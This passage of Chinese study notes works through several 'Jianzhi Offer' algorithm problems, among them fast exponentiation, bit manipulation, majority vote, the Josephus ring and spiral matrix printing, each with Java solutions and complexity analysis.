题目\n\n>实现 pow(x, n) ，即计算 x 的 n 次幂函数（即，x<sup>n</sup>）。不得使用库函数，同时不需要考虑大数问题。\n>\n>示例 1：\n>\n>```\n>输入：x = 2.00000, n = 10\n>输出：1024.00000\n>```\n>\n>示例 2：\n>\n>```\n>输入：x = 2.10000, n = 3\n>输出：9.26100\n>```\n>\n>示例 3：\n>\n>```\n>输入：x = 2.00000, n = -2\n>输出：0.25000\n>解释：2-2 = 1/22 = 1/4 = 0.25\n>```\n\n### 解答\n\n-   对于任何十进制正整数 n ，设其二进制为 \"b<sub>m</sub>...b<sub>3</sub>b<sub>2</sub>b<sub>1</sub>\"\n-   n = 1b<sub>1</sub> + 2b<sub>2</sub> + 4b<sub>3</sub> + ... + 2<sup>m−1</sup>b<sub>m</sub>\n-   x<sup>n</sup> = x<sup>1b<sub>1</sub> + 2b<sub>2</sub> + 4b<sup>3</sup> + ... + 2<sup>m−1</sup>b<sub>m</sub></sup> = x<sup>1b<sub>1</sub></sup>x<sup>2b<sub>2</sub></sup>x<sup>4b<sup>3</sup></sup>...x<sup>2<sup>m−1</sup>b<sub>m</sub></sup>\n\n根据以上推导，可把计算 x<sup>n</sup> 转化为解决以下两个问题：\n\n-   **计算 x<sup>1</sup>,x<sup>2</sup>,x<sup>4</sup>,...,x<sup>2m−1</sup>的值：** 循环赋值操作 x = x<sup>2</sup> 即可；\n-   **获取二进制各位 b<sub>1</sub>,b<sub>2</sub>,b<sub>3</sub>,...,b<sub>m</sub> 的值：** 循环执行以下操作即可。\n    1.  **n&1 （与操作）：** 判断 n 二进制最右一位是否为 1 ；\n    2.  **n>>1 （移位操作）：** n 右移一位（可理解为删除最后一位）。\n\n> Java 代码中 `int32` 变量 n∈\\[−2147483648,2147483647]，因此当 n\\=−2147483648 时执行 n \\= −n 会因越界而赋值出错。解决方法是先将 n 存入 `long` 变量 b ，后面用 b 操作即可。\n\n```java\nclass Solution {\n    public double myPow(double x, int n) {\n        if(x == 0) return 0;\n        long b = n;\n        double res = 1.0;\n        if(b < 0) {\n            x = 1 / x;\n            b = -b;\n        }\n        while(b > 0) {\n            if((b & 1) == 1) res *= x;\n            x *= x;\n            b >>= 1;\n        }\n        return res;\n    }\n}\n```\n\n-   如果 n 为偶数： x<sup>n</sup> =  x<sup>n/2</sup> * x<sup>n/2</sup>* x<sup>n%2</sup>\n-   如果 n 为奇数： x<sup>n</sup> =  x<sup>n/2</sup> * x<sup>n/2</sup> * x<sup>n%2</sup>\n\n```java\nclass Solution {\n    public double myPow(double x, int n) {\n        if(n == 0) return 1;\n        if(n == 1) return x;\n        if(n == -1) return 1 / x;\n        double half = myPow(x, n / 2);\n        double mod = myPow(x, n % 2);\n        return half * half * mod;\n    }\n}\n```\n\n### 复杂度\n\n-   **时间复杂度 O(log<sub>2</sub>n)：** 二分的时间复杂度为对数级别。\n-   **空间复杂度 O(1) ：** res, b 等变量占用常数大小额外空间。\n\n## 33. 二叉搜索树的后序遍历序列\n\n### 题目\n\n>输入一个整数数组，判断该数组是不是某二叉搜索树的后序遍历结果。如果是则返回 true，否则返回 false。假设输入的数组的任意两个数字都互不相同。\n>\n>参考以下这颗二叉搜索树：\n>\n>         5\n>        / \\\n>       2   6\n>      / \\\n>     1   3\n>\n>示例 1：\n>\n>```\n>输入: [1,6,3,2,5]\n>输出: false\n>```\n>\n>示例 2：\n>\n>```\n>输入: [1,3,2,6,5]\n>输出: true\n>```\n\n### 解答\n\n- **后序遍历定义：** `[ 左子树 | 右子树 | 根节点 ]` ，即遍历顺序为 “左、右、根” 。\n\n![](https://img.jwt1399.top/img/202209012207166.png)\n\n##### 递归解析：\n\n-   **终止条件：** 当 left ≥ right，说明此子树节点数量 ≤ 1 ，无需判别正确性，因此直接返回 true；\n-   **递推工作：**\n    \n    1. **划分左右子树：** 遍历后序遍历的 \\[left,right] 区间元素，寻找 **第一个大于根节点** 的节点，索引记为 m 。\n    \n       -   此时，可划分出左子树区间 \\[left,m−1] \n    -   右子树区间 \\[m,right−1]\n       -   根节点索引 right \n    \n    2. **判断是否为二叉搜索树：**\n    \n       -   **左子树区间** [left,m−1] 内的所有节点都应 < postorder\\[right\\]。\n       -   **右子树区间** [m,right−1\\] 内的所有节点都应 > postorder\\[right\\] 。\n-   **返回值：** 所有子树都需正确才可判定正确，因此使用 **与逻辑符** && 连接。\n    1.  **p = right ：** 判断 **此树** 是否正确。\n    2.  **recur(left,m−1) ：** 判断 **此树的左子树** 是否正确。\n    3.  **recur(m,right−1)：** 判断 **此树的右子树** 是否正确。\n\n```java\nclass Solution {\n    public boolean verifyPostorder(int[] postorder) {\n        return recur(postorder, 0, postorder.length - 1);\n    }\n    boolean recur(int[] postorder, int left, int right) {\n        if(left >= right) return true;\n        int rootValue = postorder[right]; // 根节点的值\n        int p = left;\n        while(postorder[p] < rootValue) p++; //左子树\n        int m = p;\n        while(postorder[p] > rootValue) p++; //右子树\n        return p == right && recur(postorder, left, m - 1) && recur(postorder, m, right - 1);\n    }\n}\n```\n\n### 复杂度\n\n-   **时间复杂度 O(N<sup>2</sup>) ：** 每次调用 recur(left,right) 减去一个根节点，因此递归占用 O(N) ；最差情况下（即当树退化为链表），每轮递归都需遍历树所有节点，占用 O(N) 。\n-   **空间复杂度 O(N) ：** 最差情况下（即当树退化为链表），递归深度将达到 N 。\n\n# 第 21 天 位运算（简单）\n\n## 15. 二进制中1的个数\n\n### 题目\n\n>编写一个函数，输入是一个无符号整数（以二进制串的形式），返回其二进制表达式中数字位数为 '1' 的个数（也被称为汉明重量)。\n>\n>提示：\n>\n>请注意，在某些语言（如 Java）中，没有无符号整数类型。在这种情况下，输入和输出都将被指定为有符号整数类型，并且不应影响您的实现，因为无论整数是有符号的还是无符号的，其内部的二进制表示形式都是相同的。\n>在 Java 中，编译器使用 二进制补码 记法来表示有符号整数。因此，在上面的 示例 3 中，输入表示有符号整数 -3。\n>\n>\n>示例 1：\n>\n>```\n>输入：n = 11 (控制台输入 00000000000000000000000000001011)\n>输出：3\n>解释：输入的二进制串 00000000000000000000000000001011 中，共有三位为 '1'。\n>```\n>\n>示例 2：\n>\n>```\n>输入：n = 128 (控制台输入 00000000000000000000000010000000)\n>输出：1\n>解释：输入的二进制串 00000000000000000000000010000000 中，共有一位为 '1'。\n>```\n>\n>示例 3：\n>\n>```\n>输入：n = 4294967293 (控制台输入 11111111111111111111111111111101，部分语言中 n = -3）\n>输出：31\n>解释：输入的二进制串 11111111111111111111111111111101 中，共有 31 位为 '1'。\n>```\n\n### 解答\n\n#### 方法1：调用API\n\n```java\npublic class Solution {\n    // you need to treat n as an unsigned value\n    public int hammingWeight(int n) {\n        return Integer.bitCount(n);\n    }\n}\n```\n\n#### 方法2：**逐位判断**\n\n-   根据 **与运算** 定义，设二进制数字 n ，则有：\n    -   若 n&1\\=0 ，则 n 二进制 **最右一位** 为 0 ；\n    -   若 n&1\\=1，则 n 二进制 **最右一位** 为 1 。\n-   根据以上特点，考虑以下 **循环判断** ：\n    1.  判断 n 最右一位是否为 1 ，根据结果计数。\n    2.  将 n 右移一位（本题要求把数字 n 看作无符号数，因此使用 **无符号右移**(>>>) 操作）。\n\n```java\npublic class Solution {\n    public int hammingWeight(int n) {\n        int res = 0;\n        while(n != 0){\n            if((n&1) == 1) \n                res++;\n            n = n>>>1;\n        }\n        return res;\n    }\n}\n\n//优化\npublic class Solution {\n    public int hammingWeight(int n) {\n        int res = 0;\n        while(n != 0) {\n            res += n & 1;\n            n >>>= 1;\n        }\n        return res;\n    }\n}\n```\n\n#### 方法3：**巧用** n \\& (n - 1)\n\n-   **(n−1) 解析：** 二进制数字 n 最右边的 1 变成 0 ，此 1 右边的 0 都变成 1 。\n-   **n&(n−1) 解析：** 二进制数字 n 最右边的 1 变成 0 ，其余不变。即消去最右边 1\n\n![](https://img.jwt1399.top/img/202209021306142.png)\n\n```java\npublic class Solution {\n    public int hammingWeight(int n) {\n        int res = 0;\n        while(n != 0) {\n            res++;\n            n &= n - 1;\n        }\n        return res;\n    }\n}\n```\n\n### 复杂度\n\n#### 方法2\n\n-   **时间复杂度 O(log<sub>2</sub>n)：** 此算法循环内部仅有 **移位、与、加** 等基本运算，占用 O(1) ；逐位判断需循环 log<sub>2</sub>n 次，其中 log<sub>2</sub>n 代表数字 n 最高位 1 的所在位数（例如 log<sub>2</sub>4\\=2, log<sub>2</sub>16=4）。\n-   **空间复杂度 O(1) ：** 变量 res 使用常数大小额外空间。\n\n#### 方法3\n\n-   **时间复杂度 O(M) ：** 循环内部仅有减法、加、与运算，占用 O(1) ；设 M 为二进制数字 n 中 1 的个数，则需循环 M 次（每轮消去一个 1 ），占用 O(M) 。\n-   **空间复杂度 O(1) ：** 变量 res 使用常数大小额外空间。\n\n## 65. 不用加减乘除做加法\n\n### 题目\n\n>写一个函数，求两个整数之和，要求在函数体内不得使用 “+”、“-”、“*”、“/” 四则运算符号。\n>\n>示例:\n>\n>```\n>输入: a = 1, b = 1\n>输出: 2\n>```\n\n### 解答\n\n![](https://img.jwt1399.top/img/202209021331863.png)\n\n因为不能使用“+”，所以不能直接 n + c ，所以循环求 n 和 c，直至进位 c = 0；此时 s = n ，返回 n 即可。\n\n```java\nclass Solution {\n    public int add(int a, int b) {\n        while(b != 0) { // 当进位为 0 时跳出\n            int c = (a & b) << 1;  // c = 进位\n            int n = a ^ b; // n = 非进位和\n             a = n;  // a = 非进位和\n             b = c; // b = 进位\n        }\n        return a;\n    }\n}\n\n//优化\nclass Solution {\n    public int add(int a, int b) {\n        while(b != 0) { // 当进位为 0 时跳出\n            int c = (a & b) << 1;  // c = 进位\n            a ^= b; // a = 非进位和\n            b = c; // b = 进位\n        }\n        return a;\n    }\n}\n```\n\n### 复杂度\n\n-   **时间复杂度 O(1) ：** 最差情况下（例如 a\\= 0x7fffffff , b\\=1 时），需循环 32 次，使用 O(1) 时间；每轮中的常数次位操作使用 O(1) 时间。\n-   **空间复杂度 O(1) ：** 使用常数大小的额外空间。\n\n# 第 22 天 位运算（中等）\n\n## 56 - I. 数组中数字出现的次数\n\n### 题目\n\n>一个整型数组 nums 里除两个数字之外，其他数字都出现了两次。请写程序找出这两个只出现一次的数字。要求时间复杂度是O(n)，空间复杂度是O(1)。\n>\n> 示例 1：\n>\n>输入：nums = [4,1,4,6]\n>输出：[1,6] 或 [6,1]\n>示例 2：\n>\n>输入：nums = [1,2,10,4,1,4,3,3]\n>输出：[2,10] 或 [10,2]\n\n### 解答\n\n如果问题是：一个整型数组 nums 里**有一个**只出现一次的数字，其他数字都出现了两次。那么可以很容易求出这个数字\n\n```\na⊕a⊕b⊕b⊕...⊕x\n=0⊕0⊕...⊕x\n=x\n```\n```java\npublic int[] singleNumber(int[] nums) {\n    int x = 0;\n    for(int num : nums)  // 1. 遍历 nums 执行异或运算\n        x ^= num;\n    return x;            // 2. 返回出现一次的数字 x\n}\n```\n\n本题难点： 数组 nums **有两个**只出现一次的数字，因此无法通过异或直接得到这两个数字。\n\n解决思路是将两个数字拆分到两个子数组中，再分别遍历两个子数组执行异或\n\n设两个只出现一次的数字为 x , y ，由于 x ≠ y，则 x 和 y 二进制至少有一位不同（即分别为 0 和 1 ），根据此位可以将 nums 拆分为分别包含 x 和 y 的两个子数组。\n\n```\na⊕a⊕b⊕b⊕...⊕x⊕y  \n=0⊕0⊕...⊕x⊕y\n=x⊕y\n```\n\n根据异或运算定义，若整数 x⊕y 某二进制位为 1 ，则 x 和 y 的此二进制位一定不同。换言之，找到 x⊕y 某位为 1 的二进制位 m，即可将数组 nums 拆分为包含 x 和 y 的两个子数组。\n\n- 若 (x⊕y) \\& 0001 = 1 ，则 x⊕y 的右边第一位为 1 ；\n- 若 (x⊕y) \\& 0010 = 1，则 x⊕y 的右边第二位为 1 ；\n- 以此类推……\n\n![](https://img.jwt1399.top/img/202209031340951.png)\n\n```java\nclass Solution {\n    public int[] singleNumbers(int[] nums) {\n      int n = 0, m = 1, x = 0, y = 0;\n      for(int num : nums)\n        n ^= num;\n      while((n & m) == 0)\n        m <<= 1;\n      for(int num : nums)\n        if((num & m) == 0)\n          x ^= num;\n        else y ^= num;\n      return new int[]{x,y};\n    }\n}\n```\n\n### 复杂度\n\n-   **时间复杂度 O(N) ：** 线性遍历 nums 使用 O(N) 时间，遍历 x⊕y 二进制位使用 O(32)\\=O(1) 时间。\n-   **空间复杂度 O(1) ：** 辅助变量 n , m , x , y 使用常数大小额外空间。\n\n## 56 - II. 数组中数字出现的次数 II\n\n### 题目\n\n>在一个数组 nums 中除一个数字只出现一次之外，其他数字都出现了三次。请找出那个只出现一次的数字。\n>\n>示例 1：\n>\n>```\n>输入：nums = [3,4,3,3]\n>输出：4\n>```\n>\n>示例 2：\n>\n>```\n>输入：nums = [9,1,7,9,7,9,7]\n>输出：1\n>```\n\n### 解答\n\n#### 方法1：哈希表\n\n```java\nclass Solution {\n    public int singleNumber(int[] nums) {\n        Map<Integer, Integer> map = new HashMap<>();\n        // 加入哈希表\n        for(int i = 0; i < nums.length; i++) {\n            map.put(nums[i], map.getOrDefault(nums[i], 0) + 1);\n        }\n        // 遍历找出第一个次数为1的数\n        for(int i = 0; i < nums.length; i++) {\n            if(map.get(nums[i]) == 1) {\n                return nums[i];\n            }\n        }\n        return -1;\n    }\n}\n```\n\n#### 方法2：位运算\n\n![](https://img.jwt1399.top/img/202209031429884.png)\n\n使用 **与运算** ，可获取二进制数字 num 的最右一位 n1 ：\n\nn1\\=num&i\n\n配合 **无符号右移操作** ，可获取 num 所有位的值（即 n1 ~ n32）：\n\nnum\\=num\\>\\>\\>1\n\n建立一个长度为 32 的数组 counts ，通过以上方法可记录所有数字的各二进制位的 1 的出现次数。\n\n```java\nint[] counts = new int[32];\nfor(int i = 0; i < nums.length; i++) {\n    for(int j = 0; j < 32; j++) {\n        counts[j] += nums[i] & 1; // 更新第 j 位\n        nums[i] >>>= 1; // 第 j 位 --> 第 j + 1 位\n    }\n}\n\n```\n\n将 counts 各元素对 3 求余，则结果为 “只出现一次的数字” 的各二进制位。\n\n```java\nfor(int i = 0; i < 32; i++) {\n    counts[i] %= 3; // 得到 只出现一次的数字 的第 (31 - i) 位 \n}\n```\n\n利用 **左移操作** 和 **或运算** ，可将 counts 数组中各二进位的值恢复到数字 res 上（循环区间是 i∈\\[0,31\\]）。\n\n```java\nfor(int i = 0; i < counts.length; i++) {\n    res <<= 1; // 左移 1 位\n    res |= counts[31 - i]; // 恢复第 i 位的值到 res\n}\n```\n\n最终返回 res 即可。\n\n```java\nclass Solution {\n    public int singleNumber(int[] nums) {\n        int[] counts = new int[32];\n        for(int num : nums) {\n            for(int j = 0; j < 32; j++) {\n                counts[j] += num & 1;\n                num >>>= 1;\n            }\n        }\n        int res = 0, m = 3;\n        for(int i = 0; i < 32; i++) {\n            res <<= 1;\n            res |= counts[31 - i] % m;\n        }\n        return res;\n    }\n}\n```\n\n### 复杂度\n\n#### 方法1\n\n-   **时间复杂度 O(N) ：** 其中 N 为数组 nums 的长度；遍历数组占用 O(N) \n-   **空间复杂度 O(N) ：**  HashMap 使用 O(N) 额外空间\n\n#### 方法2\n\n-   **时间复杂度 O(N) ：** 其中 NNN 位数组 nums 的长度；遍历数组占用 O(N) ，每轮中的常数个位运算操作占用 O(1) 。\n-   **空间复杂度 O(1) ：** 数组 counts 长度恒为 32 ，占用常数大小的额外空间。\n\n# 第 23 天 数学（简单）\n\n## 39. 数组中出现次数超过一半的\n\n### 题目\n\n>数组中有一个数字出现的次数超过数组长度的一半，请找出这个数字。\n>\n>你可以假设数组是非空的，并且给定的数组总是存在多数元素。\n>\n>示例 1:\n>\n>```\n>输入: [1, 2, 3, 2, 2, 2, 5, 4, 2]\n>输出: 2\n>```\n\n### 解答\n\n#### 方法1：哈希表\n\n```java\nclass Solution {\n    public int majorityElement(int[] nums) {\n        Map<Integer, Integer> map = new HashMap<>();\n        for(int i = 0; i < nums.length; i++){\n            map.put(nums[i], map.getOrDefault(nums[i], 0) + 1);\n        }\n        for(int i = 0; i < nums.length; i++){\n            if(map.get(nums[i]) > (nums.length/2)){\n                return nums[i];\n            }      \n        }\n        return 0;\n    }\n}\n\n//优化\nclass Solution {\n    public int majorityElement(int[] nums) {\n        Map<Integer, Integer> map = new HashMap<>();\n        for(int num : nums){\n            map.put(num, map.getOrDefault(num, 0) + 1);\n            if(map.get(num) > nums.length/2) \n                return num;\n        }\n        return 0;\n    }\n}\n\n```\n\n#### 方法2：排序\n\n所求的数字出现次数多于一半，那么排序后必定在中间\n\n```java\nclass Solution {\n    public int majorityElement(int[] nums) {\n        Arrays.sort(nums);\n        return nums[nums.length/2];\n    }\n}\n```\n\n#### 方法3：摩尔投票法\n\n核心理念为 **票数正负抵消**，设输入数组 nums 的众数为 x ，数组长度为 n 。\n\n- 推论一： 若记 众数 的票数为 +1 ，非众数 的票数为 −1 ，则一定有所有数字的票数和 > 0 \n\n- 推论二： 若数组的前 a 个数字的 票数和 =0 ，则 数组剩余 (n-a) 个数字的 票数和一定仍 >0 ，即后 (n-a) 个数字的众数仍为 x \n\n![](https://img.jwt1399.top/img/202209041206429.png)\n\n##### 算法流程:\n\n1.  **初始化：** 票数统计 `votes = 0` ， 众数 `x = 0`；\n2.  **循环：** 遍历数组 `nums` 中的每个数字 `num` ；\n    1.  当 票数 `votes` 等于 0 ，则假设当前数字 `num` 是众数；\n    2.  当 `num = x` 时，票数 `votes` 自增 1 ；当 `num != x` 时，票数 `votes` 自减 1 ；\n3.  **返回值：** 返回 `x` 即可；\n\n```java\nclass Solution {\n    public int majorityElement(int[] nums) {\n      int votes = 0, x = 0;\n      for(int num : nums){\n        if(votes == 0) x = num;\n        if(num == x) votes++;\n        else votes--;\n      }\n      return x;\n    }\n}\n\n//优化\nclass Solution {\n    public int majorityElement(int[] nums) {\n        int x = 0, votes = 0;\n        for(int num : nums){\n            if(votes == 0) x = num;\n            votes += num == x ? 1 : -1;\n        }\n        return x;\n    }\n}\n```\n\n### 复杂度\n\n#### 方法1\n\n-   **时间复杂度 O(N) ：** 其中 N 为数组 nums 的长度；遍历数组占用 O(N) \n-   **空间复杂度 O(N) ：**  HashMap 使用 O(N) 额外空间\n\n#### 方法2\n\n**时间复杂度 O(nlogn) **\n\n### 方法3\n\n-   **时间复杂度 O(N)：** N 为数组 `nums` 长度。\n-   **空间复杂度 O(1) ：** `votes` 变量使用常数大小的额外空间。\n\n## 66. 构建乘积数组\n\n### 题目\n\n>给定一个数组 A[0,1,…,n-1]，请构建一个数组 B[0,1,…,n-1]，其中 B[i] 的值是数组 A 中除了下标 i 以外的元素的积, 即 B[i]=A[0]×A[1]×…×A[i-1]×A[i+1]×…×A[n-1]。不能使用除法。\n>\n>示例:\n>\n>```\n>输入: [1,2,3,4,5]\n>输出: [120,60,40,30,24]\n>```\n\n### 解答\n\n根据表格的主对角线（全为 1 ），可将表格分为 **上三角** 和 **下三角** 两部分。分别迭代计算下三角和上三角两部分的乘积，即可 **不使用除法** 就获得结果。\n\n![](https://img.jwt1399.top/img/202209041308244.png)\n\n```java\nclass Solution {\n    public int[] constructArr(int[] a) {\n        int len = a.length;\n        if(len == 0) return new int[0];\n        int[] b = new int[len];\n        b[0] = 1;\n        int tmp = 1;\n        for(int i = 1; i < len; i++) {//计算下三角\n            b[i] = b[i - 1] * a[i - 1];\n        }\n        for(int i = len - 2; i >= 0; i--) {//计算上三角\n            tmp *= a[i + 1];\n            b[i] *= tmp;\n        }\n        return b;\n    }\n}\n\n\nclass Solution {\n    public int[] constructArr(int[] a) {\nint n = a.length;\n    int[] B = new int[n];\n    for (int i = 0, product = 1; i < n; product *= a[i], i++)       /* 从左往右累乘 */\n        B[i] = product;\n    for (int i = n - 1, product = 1; i >= 0; product *= a[i], i--)  /* 从右往左累乘 */\n        B[i] *= product;\n    return B;\n    }\n}\n```\n\n### 复杂度\n\n-   **时间复杂度 O(N)：** 其中 N 为数组长度，两轮遍历数组 a ，使用 O(N) 时间。\n-   **空间复杂度 O(1)：** 变量 tmp 使用常数大小额外空间（数组 b 作为返回值，不计入复杂度考虑）。\n\n# 第 24 天 数学（中等）\n\n## 14- I. 剪绳子\n\n### 题目\n\n>给你一根长度为 n 的绳子，请把绳子剪成整数长度的 m 段（m、n都是整数，n>1并且m>1），每段绳子的长度记为 k[0],k[1]...k[m-1]。请问 k[0]\\*k[1]\\*...\\*k[m-1] 可能的最大乘积是多少？例如，当绳子的长度是8时，我们把它剪成长度分别为2、3、3的三段，此时得到的最大乘积是18。\n>\n>示例 1：\n>\n>```\n>输入: 2\n>输出: 1\n>解释: 2 = 1 + 1, 1 × 1 = 1\n>```\n>\n>示例 2:\n>\n>```\n>输入: 10\n>输出: 36\n>解释: 10 = 3 + 3 + 4, 3 × 3 × 4 = 36\n>```\n\n### 解答\n\n**数学推导：**\n\n- ① 当所有绳段长度相等时，乘积最大。\n\n- ② 最优的绳段长度为 3 。\n\n##### 切分规则：\n\n1.  **最优：** 3 。把绳子尽可能切为多个长度为 3 的片段，留下的最后一段绳子的长度可能为 0,1,2 三种情况。\n2.  **次优：** 2 。若最后一段绳子长度为 2 ；则保留，不再拆为 1+1 。\n3.  **最差：** 1 。若最后一段绳子长度为 1 ；则应把一份 3+1 替换为 2+2，因为 2×2\\>3×1\n\n![](https://img.jwt1399.top/img/202209051336775.png)\n\n##### 算法流程：\n\n1.  当 n ≤ 3 时，按照规则应不切分，但由于题目要求必须剪成 m\\>1 段，因此必须剪出一段长度为 1 的绳子，即返回 n−1 。\n2.  当 n > 3 时，求 n 除以 3 的 整数部分 a 和 余数部分 b （即 n\\=3a+b），并分为以下三种情况：\n    -   当 b = 0 时，直接返回 3<sup>a</sup>；\n    -   当 b = 1 时，要将一个 1+3 转换为 2+2，因此返回 3<sup>a-1</sup>×4；\n    -   当 b\\=2 时，返回 3<sup>a</sup>×2。\n\n```java\nclass Solution {\n    public int cuttingRope(int n) {\n      if(n <= 3) return n - 1;\n      int a = n / 3;\n      int b = n % 3;\n      if(b == 0) return (int)Math.pow(3,a);\n      if(b == 1) return (int)Math.pow(3,a-1)*4;\n      return (int)Math.pow(3,a) * 2;\n    }\n}\n```\n\n### 复杂度\n\n-   **时间复杂度 O(1) ：** 仅有求整、求余、次方运算。\n-   **空间复杂度 O(1) ：** 变量 `a` 和 `b` 使用常数大小额外空间。\n\n## 57 - II. 和为s的连续正数序列\n\n### 题目\n\n>输入一个正整数 target ，输出所有和为 target 的连续正整数序列（至少含有两个数）。\n>\n>序列内的数字由小到大排列，不同序列按照首个数字从小到大排列。\n>\n>示例 1：\n>\n>```\n>输入：target = 9\n>输出：[[2,3,4],[4,5]]\n>```\n>\n>示例 2：\n>\n>```\n>输入：target = 15\n>输出：[[1,2,3,4,5],[4,5,6],[7,8]]\n>```\n\n### 解答\n\n设连续正整数序列的**左边界 i** 和**右边界 j** ，则可构建滑动窗口从左向右滑动。循环中，每轮判断滑动窗口内元素和与目标值 target 的大小关系，若相等则记录结果，若大于 target 则移动左边界 i （以减小窗口内的元素和），若小于 target 则移动右边界 j （以增大窗口内的元素和）。\n\n![](https://img.jwt1399.top/img/202209051406993.png)\n\n##### 算法流程：\n\n1.  **初始化：** 左边界 i\\=1，右边界 j\\=2，元素和 s\\=3 ，结果列表 res ；\n\n2.  **循环：** 当 i ≥ j 时跳出；\n    -   当 s > target 时： 更新元素和 s，并向右移动左边界 i\\=i+1 ；\n    -   当 s < target 时： 向右移动右边界 j\\=j+1 ，并更新元素和 s ；\n    -   当 s = target 时： 记录连续整数序列，并向右移动左边界 i\\=i+1，更新元素和 s ；\n3.  **返回值：** 返回结果列表 res ；\n\n```java\nclass Solution {\n    public int[][] findContinuousSequence(int target) {\n      int i = 1, j = 2, s = 3;\n      List<int[]> res = new ArrayList<>();\n      while(i < j){\n        if(s > target) {\n          s -= i;\n          i++;\n        }\n        else if(s < target){\n            j++;\n            s += j;\n        } \n        else{\n            int[] ans = new int[j-i+1];\n        \tfor(int k = i; k <= j; k++)\n          \t    ans[k - i] = k;\n            res.add(ans);\n            s -= i;  \n            i++;\n            \n        }\n      }\n      return res.toArray(new int[0][]);\n    }\n}\n```\n\n### 复杂度\n\n-   **时间复杂度 O(N) ：** 其中 N\\=target；连续整数序列至少有两个数字，而 i<j恒成立，因此至多循环 target 次；\n-   **空间复杂度 O(1) ：** 变量 i , j , s 使用常数大小的额外空间。\n\n## 62.圆圈中最后剩下的数字\n\n### 题目\n\n>0,1,···,n-1这n个数字排成一个圆圈，从数字0开始，每次从这个圆圈里删除第m个数字（删除后从下一个数字开始计数）。求出这个圆圈里剩下的最后一个数字。\n>\n>例如，0、1、2、3、4这5个数字组成一个圆圈，从数字0开始每次删除第3个数字，则删除的前4个数字依次是2、0、4、1，因此最后剩下的数字是3。\n>\n> \n>\n>示例 1：\n>\n>```\n>输入: n = 5, m = 3\n>输出: 3\n>```\n>\n>示例 2：\n>\n>```\n>输入: n = 10, m = 17\n>输出: 2\n>```\n\n### 解答\n\n这个问题是以弗拉维奥·约瑟夫命名的，称为“**约瑟夫环**”问题，可使用 **动态规划** 解决。\n\n**最容易想到的方法是：**构建一个长度为 n 的链表，各节点值为对应的顺序索引；每轮删除第 m 个节点，直至链表长度为 1 时结束，返回最后剩余节点的值即可。模拟法需要循环删除 n−1 轮，每轮在链表中寻找删除节点需要 m 次访问操作（链表线性遍历），因此总体时间复杂度为 O(nm) 。根据题目给定的 m,n 取值范围，可知此时间复杂度是不可接受的。\n\n**动态规划解法**\n\n设 `f(n,m)` 表示在 n 个数字(0～n-1)中不断删除第 m 个数字最后剩下的数字。删除一个数字后剩下了 n-1 个数字，那么再次删除就是在 n-1 个数字中删除第 m 个数字，可以表示为 `f(n-1,m)`。\n\n但实际上直接这么表示是不对的。因为`f(n,m)`表示的是从区间`[0~n-1]`不断进行删除操作，被删除的元素是`k=(m-1)%n`，而下一次删除时，起点是 `k+1（即m%n） `，区间不再满足上述要求，因此从第二步不断删除的结果可以表示为`f'(n-1,m)`。则有：`f(n,m) = f'(n-1,m)`\n\n现在就要想办法找到 `f'(n-1,m)`和`f(n- 1, m)`之间的关系。则二者操作的区间表示如下:\n\n```\nf'(n-1,m)表示序列: k+1 k+2 k+3 ... n-1     0     1  ... k-1\nf(n-1,m) 表示序列:  0   1   2  ... n-k-2 n-k-1  n-k ... n-2\n```\n\n由此推出 `f'(n-1,m)=(f(n-1,m)+k+1)%n`\n\n化简：\n\n```\n因为\nf'(n-1,m)=(f(n-1,m)+k+1)%n\nk+1= m%n\nf(n,m) = f'(n-1,m)\n所以\nf(n-1,m)=[f(n-1,m)+m]%n\n```\n\n由此可知 f(n,m) 可由 f(n-1,m) 得到，f(n-1,m) 可由 f(n-2,m) 得到，……，f(2,m) 可由 f(1,m) 得到；因此，若给定 f(1,m) 的值，就可以递推至任意 f(n,m) 。而 f(1,m) = 0 恒成立。得到如下递归关系：\n\n![](https://img.jwt1399.top/img/202209111343271.png)\n\n##### 动态规划解析：\n\n1.  **状态定义：** 设「i,m问题」的解为 dp\\[i\\]；\n2.  **转移方程：** 通过以下公式可从 dp\\[i−1] 递推得到 dp\\[i\\] \\= (dp\\[i−1] + m) % i；\n\n3.  **初始状态：**「1,m 问题」的解恒为 0 ，即 dp\\[1\\] = 0；\n4.  **返回值：** 返回「n,m 问题」的解 dp\\[n\\] ；\n\n```java\nclass Solution {\n    public int lastRemaining(int n, int m) {\n      int dp[] = new int[n+1]; \n      dp[1] = 0;\n      for(int i = 2; i <= n; i++){\n        dp[i] = (dp[i-1] + m) % i;\n      }\n      return dp[n];\n    }\n}\n\n//优化\n//根据状态转移方程的递推特性，无需建立状态列表 dp ，而使用一个变量 x 执行状态转移即可。\nclass Solution {\n    public int lastRemaining(int n, int m) {\n        int x = 0;\n        for (int i = 2; i <= n; i++) {\n            x = (x + m) % i;\n        }\n        return x;\n    }\n}\n```\n\n### 复杂度\n\n-   **时间复杂度 O(n)：** 状态转移循环 n−1次使用 O(n)时间，状态转移方程计算使用 O(1) 时间；\n-   **空间复杂度 O(1)：** 使用常数大小的额外空间；\n\n# 第 25 天 模拟（中等）\n\n## 29. 顺时针打印矩阵\n\n### 题目\n\n>输入一个矩阵，按照从外向里以顺时针的顺序依次打印出每一个数字。\n>\n>示例 1：\n>\n>```\n>输入：matrix = [[1,2,3],[4,5,6],[7,8,9]]\n>输出：[1,2,3,6,9,8,7,4,5]\n>```\n>\n>示例 2：\n>\n>```\n>输入：matrix = [[1,2,3,4],[5,6,7,8],[9,10,11,12]]\n>输出：[1,2,3,4,8,12,11,10,9,5,6,7]\n>```\n\n### 解答\n\n顺时针打印矩阵的顺序是 **“从左向右、从上向下、从右向左、从下向上”** 循环。\n\n**算法流程：**\n\n1.  **空值处理：** 当 `matrix` 为空时，直接返回空列表 `[]` 即可。\n2.  **初始化：** 矩阵 左、右、上、下 四个边界 `left` , `right` , `top` , `bottom` ，用于打印的结果列表 `res` 。\n3.  **循环打印：** “从左向右、从上向下、从右向左、从下向上” 四个方向循环，每个方向打印中做以下三件事 _（各方向的具体信息见下表）_ ；\n    1.  根据边界打印，即将元素按顺序添加至列表 `res` 尾部；\n    2.  边界向内收缩 1 （代表已被打印）；\n    3.  判断是否打印完毕（边界是否相遇），若打印完毕则跳出。\n4.  **返回值：** 返回 `res` 即可。\n\n| 打印方向 | 1\\. 根据边界打印              | 2\\. 边界向内收缩     | 3\\. 是否打印完毕    |\n| -------- | ----------------------------- | -------------------- | ------------------- |\n| 从左向右 | 左边界`left` ，右边界 `right` | 上边界 `top` 加 1    | 是否 `top > bottom` |\n| 从上向下 | 上边界 `top` ，下边界`bottom` | 右边界 `right` 减 1  | 是否 `left > right` |\n| 从右向左 | 右边界 `right` ，左边界`left` | 下边界 